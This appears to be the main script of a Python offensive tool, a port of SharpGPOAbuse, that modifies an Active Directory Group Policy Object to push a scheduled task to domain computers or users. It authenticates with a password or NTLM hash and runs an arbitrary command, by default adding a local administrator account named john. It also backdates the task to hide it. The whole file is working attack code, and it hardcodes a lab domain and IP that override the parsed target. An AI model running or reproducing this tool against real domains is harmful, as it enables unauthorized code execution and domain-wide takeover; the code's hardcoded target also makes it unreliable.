"""
This tool is a partial python implementation of SharpGPOAbuse
https://github.com/FSecureLABS/SharpGPOAbuse
All credit goes to @pkb1s for his research, especially regarding gPCMachineExtensionNames

Also thanks to @airman604 for schtask_now.py that was used and modified in this project
https://github.com/airman604/schtask_now
"""

import argparse
import logging
import re
import sys

from impacket.smbconnection import SMBConnection

from pygpoabuse import logger
from pygpoabuse.gpo import GPO

parser = argparse.ArgumentParser(add_help=True, description="Add ScheduledTask to GPO")

parser.add_argument('target', action='store', help='domain/username[:password]')
parser.add_argument('-gpo-id', action='store', metavar='GPO_ID', help='GPO to update ')
parser.add_argument('-user', action='store_true', help='Set user GPO (Default: False, Computer GPO)')
parser.add_argument('-taskname', action='store', help='Taskname to create. (Default: TASK_<random>)')
parser.add_argument('-mod-date', action='store', help='Task modification date (Default: 30 days before)')
parser.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
parser.add_argument('-description', action='store', help='Task description (Default: Empty)')
parser.add_argument('-powershell', action='store_true', help='Use Powershell for command execution')
parser.add_argument('-command', action='store',
                    help='Command to execute (Default: Add john:H4x00r123.. as local Administrator)')
parser.add_argument('-f', action='store_true', help='Force add ScheduleTask')
parser.add_argument('-v', action='count', default=0, help='Verbosity level (-v or -vv)')

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

options = parser.parse_args()

if not options.gpo_id:
    parser.print_help()
    sys.exit(1)

# Init the example's logger theme
logger.init()

if options.v == 1:
    logging.getLogger().setLevel(logging.INFO)
elif options.v >= 2:
    logging.getLogger().setLevel(logging.DEBUG)
else:
    logging.getLogger().setLevel(logging.ERROR)

targetParam = options.target + '@'
domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
    targetParam).groups('')

# In case the password contains '@'
if '@' in address:
    password = password + '@' + address.rpartition('@')[0]
    address = address.rpartition('@')[2]

if domain == '':
    logging.critical('Domain should be specified!')
    sys.exit(1)

if password == '' and username != '' and options.hashes is None:
    from getpass import getpass
    password = getpass("Password:")
elif options.hashes is not None:
    if ":" not in options.hashes:
        logging.error("Wrong hash format. Expecting lm:nt")
        sys.exit(1)

dc_ip = domain
if password != '':
    url = 'ldap+ntlm-password://hackn.lab\\{}:{}@10.10.10.1'.format(username, password)
    lmhash, nthash = "",""
else:
    url = 'ldap+ntlm-nt://hackn.lab\\{}:{}@10.10.10.1'.format(username, options.hashes.split(":")[1])
    lmhash, nthash = options.hashes.split(":")


def get_session(address, target_ip="", username="", password="", lmhash="", nthash="", domain=""):
    try:
        smb_session = SMBConnection(address, target_ip)
        smb_session.login(username, password, domain, lmhash, nthash)
        return smb_session
    except Exception as e:
        logging.error("Connection error")
        return False

try:
    smb_session = SMBConnection(dc_ip, dc_ip)
    smb_session.login(username, password, domain, lmhash, nthash)
except Exception as e:
    logging.error("SMB connection error", exc_info=True)
    sys.exit(1)

try:
    gpo = GPO(smb_session)
    task_name = gpo.update_scheduled_task(
        domain=domain,
        gpo_id=options.gpo_id,
        name=options.taskname,
        mod_date=options.mod_date,
        description=options.description,
        powershell=options.powershell,
        command=options.command,
        gpo_type="user" if options.user else "computer",
        force=options.f
    )
    if task_name:
        if gpo.update_versions(url, domain, options.gpo_id, gpo_type="user" if options.user else "computer",):
            logging.info("Version updated")
        else:
            logging.error("Error while updating versions")
            sys.exit(1)
        logging.success("ScheduledTask {} created!".format(task_name))
except Exception as e:
    logging.error("An error occurred. Use -vv for more details", exc_info=True)